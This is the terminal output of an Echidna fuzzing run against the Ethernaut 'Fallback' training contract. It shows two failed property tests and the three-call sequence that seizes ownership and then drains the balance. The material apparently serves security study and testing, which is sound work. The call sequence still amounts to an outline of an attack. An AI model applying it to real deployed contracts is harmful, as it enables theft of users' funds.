```shell
echidna-test contracts/ethernaut/01-fallback/test.sol --contract Test --config contracts/ethernaut/01-fallback/config.yaml


                                               ┌─────────────────────────────────────────────────────Echidna 1.5.1────────────────────────────────────────────────────┐
                                               │ Tests found: 2                                                                                                       │
                                               │ Seed: -5326692215904020287                                                                                           │
                                               │─────────────────────────────────────────────────────────Tests────────────────────────────────────────────────────────│
                                               │ echidna_test_owner: FAILED!                                                                                          │
                                               │                                                                                                                      │
                                               │ Call sequence:                                                                                                       │
                                               │ 1.contribute() Value: 0x1                                                                                            │
                                               │ 2.*fallback*() Value: 0x1                                                                                            │
                                               │──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────│
                                               │ echidna_test_balance: FAILED!                                                                                        │
                                               │                                                                                                                      │
                                               │ Call sequence:                                                                                                       │
                                               │ 1.contribute() Value: 0x1                                                                                            │
                                               │ 2.*fallback*() Value: 0x1                                                                                            │
                                               │ 3.withdraw()                                                                                                         │
                                               └──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```
